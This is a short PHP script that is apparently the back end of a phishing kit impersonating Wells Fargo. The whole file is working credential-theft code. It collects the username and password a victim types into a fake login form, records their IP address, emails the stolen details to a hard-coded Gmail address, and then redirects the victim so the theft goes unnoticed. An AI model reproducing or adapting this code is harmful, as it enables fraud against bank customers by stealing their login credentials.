<?

$ip = getenv("REMOTE_ADDR");
$message .= "---:||Wellsfargo||:---\n";
$message .= "Username : ".$_POST['j_username']."\n";
$message .= "Password : ".$_POST['j_password']."\n";
$message .= "IP : ".$ip."\n";
$message .= "----Ownedby|v!nc3----\n";
$recipient = "kaypresh246@gmail.com";
$subject = "Wells-$ip";
$headers = "From: wells";
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);

header("Location: wells.htm");
?>